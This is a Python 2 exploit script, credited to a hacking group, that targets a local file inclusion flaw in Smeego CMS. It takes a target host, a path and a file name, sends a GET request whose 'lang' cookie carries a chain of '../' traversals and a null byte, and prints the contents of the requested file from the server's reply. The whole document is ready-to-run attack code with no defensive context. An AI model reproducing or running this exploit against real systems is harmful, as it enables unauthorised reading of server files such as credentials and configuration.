#!/usr/bin/python
import sys
import time
import httplib
print '====================================================='
print ' Smeego CMS Local File INclude Exploit '
print ' by '
print ' 0in from Dark-Coders Programming & Security Group! '
print ' http://dark-coders.4rh.eu '
print '====================================================='
try:
target=sys.argv[1]
path=sys.argv[2]
file=sys.argv[3]
except Exception:
print '\nUse: %s [target] [path] [file]' % sys.argv[0]
quit()
i=0
lfi='../'
target+=":80"
special="%00"
file+=special
for i in range(9):
lfi+="../"
print '---------------------------------------------------------'
mysock=httplib.HTTPConnection(target)
mysock=httplib.HTTPConnection(target)
mysock.putrequest("GET",path)
mysock.putheader("User-Agent","Billy Explorer v666")
mysock.putheader('Accept', 'text/html')
mysock.putheader('Accept-Language',' en-us,en;q=0.5')
mysock.putheader('Cookie','lang=%s%s' % (lfi,file))
mysock.endheaders()
reply=mysock.getresponse()
print reply.read()
time.sleep(2)
mysock.close()
print '----------------------------------------------------------'

#EOFF